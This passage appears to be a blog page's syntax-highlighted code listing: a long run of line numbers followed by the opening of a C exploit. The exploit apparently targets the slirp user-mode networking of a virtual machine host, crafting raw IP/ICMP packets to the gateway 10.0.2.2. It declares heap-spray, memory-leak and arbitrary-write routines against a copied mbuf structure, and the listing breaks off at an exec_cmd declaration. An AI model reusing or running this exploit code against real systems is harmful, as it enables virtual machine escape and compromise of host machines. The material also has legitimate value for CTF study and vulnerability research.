class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; // close()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; // strcpy, memset(), and memcpy()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;      // struct addrinfo</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  // needed for socket(), uint8_t, uint16_t, uint32_t</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt; // needed for socket()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt; // IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt; // struct ip and IP_MAXPACKET (which is 65535)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip_icmp.h&gt; // struct icmp, ICMP_ECHO</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FAVOR_BSD          <span class="comment">// Use BSD format of tcp header</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;     // struct tcphdr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;       // inet_pton() and inet_ntop()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;       // macro ioctl is defined</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/ioctls.h&gt;     // defines values for argument "request" of ioctl.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;          // struct ifreq</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;  // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt; // struct sockaddr_ll (see man 7 packet)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt; // gettimeofday()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt; // errno, perror()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some constants.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HDRLEN 14 <span class="comment">// Ethernet header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IP4_HDRLEN 20 <span class="comment">// IPv4 header length</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TCP_HDRLEN 20 <span class="comment">// TCP header length, excludes options data</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ICMP_HDRLEN 8 <span class="comment">// ICMP header length for echo request, excludes data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s:%d(): "</span> fmt, __func__, __LINE__, ##__VA_ARGS__);   \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line">    <span class="keyword">do</span> &#123;                                                                       \</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char  g_interface[] = "ens2";</span></span><br><span class="line"><span class="keyword">char</span>  g_interface[] = <span class="string">"enp0s3"</span>;</span><br><span class="line"><span class="keyword">char</span> host[] = <span class="string">"10.0.2.2"</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span> *Slirp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_next</span>;</span> <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span> <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span> <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span> m_flags;            <span class="comment">/* Misc flags */</span></span><br><span class="line">    <span class="keyword">int</span> m_size;             <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line">    <span class="keyword">caddr_t</span> m_data; <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span> m_len;      <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span> resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span> *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span> m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some header info to pass to the send_ip_pkt</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_id;</span><br><span class="line">    <span class="keyword">uint16_t</span> ip_off;</span><br><span class="line">    <span class="keyword">bool</span> MF;</span><br><span class="line">    <span class="keyword">uint8_t</span> ip_p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function prototypes</span></span><br><span class="line"><span class="keyword">uint16_t</span> checksum(<span class="keyword">uint16_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> icmp4_checksum(struct icmp, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> tcp4_checksum(struct ip, struct tcphdr, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">uint8_t</span> *allocate_ustrmem(<span class="keyword">int</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">uint16_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">send_raw_pkt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span>, <span class="keyword">int</span>, <span class="keyword">uint8_t</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">void</span> *, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> text_base, heap_base;</span><br><span class="line"><span class="keyword">uint16_t</span> g_spray_ip_id;</span><br><span class="line"><span class="keyword">int</span> stop_flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> eth_frame[] =</span><br><span class="line">        <span class="string">"\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00"</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="keyword">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"game start"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);</span><br><span class="line">    iphdr = (struct ip *)(buf + ETH_HDRLEN);</span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">"10.0.2.15"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">"10.0.2.2"</span>);</span><br><span class="line">    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">    iphdr-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line">    iphdr-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这不需要htons，因为在ip_input里会转换一遍</span></span><br><span class="line">    iphdr-&gt;ip_len = (ICMP_HDRLEN);</span><br><span class="line">    iphdr-&gt;ip_id = (<span class="number">0xcdcd</span>);</span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    iphdr-&gt;ip_off = ((<span class="number">0</span> &lt;&lt; <span class="number">15</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">14</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">13</span>) + (<span class="number">0</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    iphdr-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line">    iphdr-&gt;ip_p = IPPROTO_ICMP;</span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != <span class="number">1</span> ||</span><br><span class="line">        (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"inet_pton() failed.\nError message: %s"</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    iphdr-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr-&gt;ip_sum = checksum((<span class="keyword">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    icmphdr = (struct icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    icmphdr-&gt;icmp_type = ICMP_ECHO;</span><br><span class="line">    <span class="comment">// Message Code (8 bits): echo request</span></span><br><span class="line">    icmphdr-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Identifier (16 bits): usually pid of sending process - pick a number</span></span><br><span class="line">    icmphdr-&gt;icmp_id = htons(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// Sequence Number (16 bits): starts at 0</span></span><br><span class="line">    icmphdr-&gt;icmp_seq = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ICMP header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    <span class="comment">// TBD</span></span><br><span class="line">    <span class="comment">// icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen);</span></span><br><span class="line">    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> exec_cmd[] = 